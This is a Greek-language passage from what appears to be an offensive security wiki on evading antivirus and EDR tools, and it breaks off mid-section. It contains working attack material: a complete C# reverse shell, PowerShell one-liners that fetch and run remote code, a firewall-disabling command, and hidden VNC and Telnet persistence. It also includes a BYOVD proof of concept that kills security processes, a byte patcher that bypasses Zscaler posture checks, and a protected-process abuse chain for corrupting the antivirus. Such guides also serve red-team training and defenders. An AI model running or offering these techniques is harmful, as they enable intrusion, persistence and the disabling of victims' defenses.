- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly μετασχηματίζοντας κανονικές εντολές σε ROP chains, υπονομεύοντας την συνήθη αντίληψή μας για το φυσιολογικό control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κάνετε download κάποια executables από το διαδίκτυο και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας σχεδιασμένος να προστατεύει τον τελικό χρήστη από το να τρέχει πιθανώς κακόβουλες εφαρμογές.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη (reputation-based), πράγμα που σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί να εκτελεστεί επιλέγοντας More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το internet, μαζί με το URL από το οποίο λήφθηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables υπογεγραμμένα με ένα **trusted** signing certificate **won't trigger SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να πάρουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** εφαρμοστεί σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά συστήματος να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφάλειας για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με τον τρόπο που το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνετε τη συνάρτηση χρήστη χώρου **`EtwEventWrite`** να επιστρέφει άμεσα χωρίς να καταγράφει γεγονότα. Αυτό γίνεται με το να γίνει patch της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για εκείνη τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory είναι γνωστό εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος να τρέξετε τα post-exploitation εργαλεία σας χωρίς να σας εντοπίσει το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, το μόνο που θα χρειαστεί να ασχοληθούμε είναι να κάνουμε patch το AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ήδη προσφέρουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διάφοροι τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει **τη δημιουργία μιας νέας θυσιαζόμενης διεργασίας**, την ένεση του post-exploitation κακόβουλου κώδικά σας σε αυτή τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και όταν ολοκληρωθεί, την τερματίζετε. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στις post-exploitation ενέργειές μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την ένεση του post-exploitation κακόβουλου κώδικα **στην ίδια τη διεργασία του**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμά της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να κάνει crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, ρίξτε μια ματιά σε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **from PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στο compromised machine πρόσβαση **to the interpreter environment installed on the Attacker Controlled SMB share**.

Δίνοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **execute arbitrary code in these languages within memory** του συστήματος που έχει παραβιαστεί.

Το repo αναφέρει: Defender εξακολουθεί να σαρώνει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-αποκρυπτογραφημένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχημένες.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **manipulate the access token or a security product like an EDR or AV**, επιτρέποντάς του να μειώσει τα προνόμια έτσι ώστε η διεργασία να μην πεθάνει αλλά να μην έχει δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

Για να το αποτρέψει αυτό τα Windows θα μπορούσαν να **prevent external processes** από το να παίρνουν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε απλά το Chrome Remote Desktop σε έναν υπολογιστή θύμα και μετά να το χρησιμοποιήσετε για να τον ελέγξετε και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά πατήστε στο MSI αρχείο για Windows για να κατεβάσετε το MSI αρχείο.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παράμετρο που δίνεται με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει τη ρύθμιση του pin χωρίς χρήση του GUI).


## Advanced Evasion

Evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να μείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα επιτεθείτε θα έχει τα δικά του δυνατά και αδύναμα σημεία.

Σας προτρέπω έντονα να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη επαφή με πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **remove parts of the binary** μέχρι να **βρει ποιο μέρος ο Defender** εντοπίζει ως κακόβουλο και να σας το αναλύσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, όλα τα Windows ερχόντουσαν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το να **ξεκινάει** όταν εκκινεί το σύστημα και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (διακριτικά) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό στο _VNC Password_
- Ορίστε έναν κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και **προσφάτως** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στο **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **prepared** να πιάσει μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε τη διακριτικότητα πρέπει να μην κάνετε μερικά πράγματα

- Μην ξεκινήσετε το `winvnc` αν τρέχει ήδη αλλιώς θα προκαλέσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια αλλιώς θα προκαλέσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για παράδειγμα κατασκευής injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από το kernel

Το Storm-2603 εκμεταλλεύτηκε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει endpoint protections πριν ρίξει ransomware. Το εργαλείο φέρνει τον δικό του **vulnerable αλλά *signed* driver** και τον καταχράται για να εκτελέσει privileged kernel operations που ούτε οι Protected-Process-Light (PPL) AV υπηρεσίες μπορούν να μπλοκάρουν.

Βασικά σημεία
1. **Signed driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος οδηγός `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Εφόσον ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνει ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Εγκατάσταση υπηρεσίας**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινά ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs που εκτίθενται από τον driver**
| IOCTL code | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει ένα αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει τελείως τις user-mode προστασίες· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να παραβλάψει kernel objects ανεξαρτήτως PPL/PP, ELAM ή άλλων hardening features.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευπαθών drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται το φόρτωμα του `AToolsKrnl64.sys`.  
•  Παρακολουθείστε τη δημιουργία νέων *kernel* services και ειδοποιήστε όταν ένας driver φορτώνεται από έναν world-writable φάκελο ή δεν υπάρχει στη λίστα επιτρεπτών.  
•  Εντοπίστε user-mode handles προς custom device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το Zscaler’s **Client Connector** εφαρμόζει κανόνες device-posture τοπικά και βασίζεται σε Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (ένα boolean αποστέλλεται στον server).  
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στον δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Πρωτότυπη λογική που τροποποιείται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1`, οπότε κάθε έλεγχος θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) process μπορεί να bind-άρει στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακάμπτονται |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζουν **πράσινο/συμμόρφωση**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο συμβιβασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς καθαρά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.

## Κατάχρηση Protected Process Light (PPL) για παρέμβαση σε AV/EDR με LOLBINs

Protected Process Light (PPL) επιβάλλει μια signer/level ιεραρχία έτσι ώστε μόνο protected processes ίσου ή υψηλότερου επιπέδου να μπορούν να παραποιήσουν το ένα το άλλο. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε καλοήθεις λειτουργίες (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.

What makes a process run as PPL
- Το στοχευόμενο EXE (και οποιεσδήποτε φορτωμένες DLLs) πρέπει να είναι υπογεγραμμένο με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λάθος επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Βοηθητικό open-source: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Σχήμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` αυτοεκκινεί και δέχεται παράμετρο για την εγγραφή ενός αρχείου log σε διαδρομή που ορίζει ο καλών.
- Όταν εκκινείται ως PPL process, η εγγραφή αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει μονοπάτια που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Εξαγωγή short path στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Δώστε το ClipUp log-path όρισμα για να αναγκάσετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο του AV (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το στοχευόμενο binary συνήθως είναι ανοιχτό/κλειδωμένο από το AV όταν τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά το boot πριν ξεκινήσει το AV, εγκαθιστώντας μια auto-start υπηρεσία που τρέχει πιο νωρίς με αξιοπιστία. Επαληθεύστε τη σειρά εκκίνησης με Process Monitor (boot logging).
4) Στο reboot, η εγγραφή με υποστήριξη PPL συμβαίνει πριν το AV κλειδώσει τα binaries του, διαφθείροντας το στοχευόμενο αρχείο και εμποδίζοντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
